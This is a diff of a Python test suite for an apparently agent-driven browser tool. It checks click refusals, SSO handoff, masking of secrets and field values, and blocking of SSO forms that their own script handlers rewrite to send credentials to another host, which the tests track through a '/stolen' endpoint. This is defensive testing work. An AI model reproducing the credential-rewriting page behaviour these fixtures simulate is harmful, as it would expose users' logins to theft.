+        assert r2["status"] == "ok", r2
         r2 = _run(sp, "click", str(go), look_key=r["look_key"], handoff=False)
-        assert r2["status"] == "refused" and re.search("input field|forms are not submitted", r2["error"]), r2
-        r = _run(sp, "look", handoff=False)
-        assert not r["page"]["url"].endswith("/logged"), r
+        assert r2["status"] == "ok" and r2["page"]["url"].endswith("/logged"), r2
     finally:
         _finish(sp)
 
 
-def test_round11_label_shadowed_action_base_fragment_and_url_scrub(origins):
+def test_round11_shadowed_action_base_fragment_and_url_scrub(origins):
     sp = "tbsgen-test-r11-b"
     try:
-        for path, label in (("/label-chk", "Download"), ("/shadow-action", "Get PDF"), ("/base-frag", "Download PDF")):
+        for path, label in (("/shadow-action", "Get PDF"), ("/base-frag", "Download PDF")):
             assert _run(sp, "open", origins[0] + path, handoff=False)["status"] == "ok", path
             r = _run(sp, "look", handoff=False)
             r2 = _run(sp, "click", str(_item(r, label)["i"]), look_key=r["look_key"], handoff=False)
-            assert r2["status"] == "refused", (path, r2)
+            assert r2["status"] == "refused" and "outside the allowed" in r2["error"], (path, r2)
             r = _run(sp, "look", handoff=False)
             assert r["page"]["url"].endswith(path), (path, r)
-        # a token in a fragment with quotes / backticks never comes back
         r = _run(sp, "open", origins[0] + "/other#code='SECRETFRAG'&x=`SECRETTICK`", handoff=False)
         r2 = _run(sp, "look", handoff=False)
         for x in (r, r2):
@@ -975,15 +1034,9 @@ def test_round12_label_of_a_submit_button_and_button_value(origins):
         _finish(sp)
 
 
-def test_round13_role_elements_and_saml_post(origins):
+def test_round13_saml_post_and_snapshot_values(origins):
     sp = "tbsgen-test-r13"
     try:
-        assert _run(sp, "open", origins[0] + "/slot-label", handoff=False)["status"] == "ok"
-        r = _run(sp, "look", handoff=False)
-        it = _item(r, "Download")
-        if it:                                      # listed (role=button): never clicked
-            r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"], handoff=False)
-            assert r2["status"] == "refused", r2
         r = _run(sp, "open", origins[0] + "/saml-post")
         assert r["status"] == "handoff", r          # an SSO hand-back page goes to the user
         assert _take_over(sp, origins[0] + "/saml-post")
@@ -991,6 +1044,46 @@ def test_round13_role_elements_and_saml_post(origins):
         assert r["page"]["login_form"] is True, r
         r2 = _run(sp, "click", str(_item(r, "Continue")["i"]), look_key=r["look_key"], handoff=False)
         assert r2["status"] == "refused", r2
-        assert not _run(sp, "look", handoff=False)["page"]["url"].endswith("/logged")
+        # look full / screenshot never carry a field value (snapshot reduced, fields masked)
+        assert _run(sp, "open", origins[0] + "/landing", handoff=False)["status"] == "ok"
+        r = _run(sp, "look", "full", handoff=False)
+        assert "PHNhbWw" not in json.dumps(r) and "SECRET" not in json.dumps(r), r
+    finally:
+        _finish(sp)
+
+
+def test_round8_sso_form_rewritten_by_its_own_handlers_is_never_sent(origins):
+    """Round 8: the checks and the press are one evaluation; a submit / click handler that turns the form into
+    a GET or points it at another host after the checks is caught right after the press: the navigation is
+    stopped before any request, and it counts as a failed login."""
+    for path in ("/sso-rewrite", "/sso-rewrite-click"):
+        sp = "tbsgen-test-sso-rw"
+        XHITS.clear()
+        try:
+            assert _run(sp, "open", origins[2] + path)["status"] == "ok"
+            r = _run(sp, "sso_login", sso_login=True)
+            assert r["sso_submitted"] is True and r["sso"] == "fail", (path, r)
+            time.sleep(2)
+            assert "/stolen" not in XHITS, (path, XHITS)
+            r = _run(sp, "look")
+            assert "/stolen" not in json.dumps(r) and r["page"]["url"].endswith(path), (path, r)
+        finally:
+            _finish(sp)
+
+
+def test_round8_sso_verification_page_is_not_submitted(origins):
+    sp = "tbsgen-test-r8-sso-ch"
+    try:
+        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
+        body = (f"const pageInfo = {_fn_src('pageInfo')};\nconst credScan = {_fn_src('credScan')};\n"
+                f"const ssoSubmit = {_fn_src('ssoSubmit')};\n"
+                "const t = await taskSpace(" + json.dumps(sp) + ");\nconst pg = (await t.pages())[0];\n"
+                "await pg.evaluate(() => { document.title = 'Just a moment...'; });\n"
+                "const r = await pg.evaluate(([f, s, pi]) => (new Function('return (' + f + ')')())([['sso.localhost'], true, s, pi, 'just a moment']),\n"
+                "  [ssoSubmit.toString(), credScan.toString(), pageInfo.toString()]);\n"
+                "console.log('R8 ' + JSON.stringify(r));\nprocess.exit(0);")
+        p = subprocess.run([EGO, "nodejs", body], capture_output=True, text=True, timeout=90)
+        line = next(x for x in (p.stdout + p.stderr).splitlines() if x.startswith("R8 "))
+        assert json.loads(line[3:]) == {"refused": "verification page on the SSO login page", "stage": "pre"}, line
     finally:
         _finish(sp)
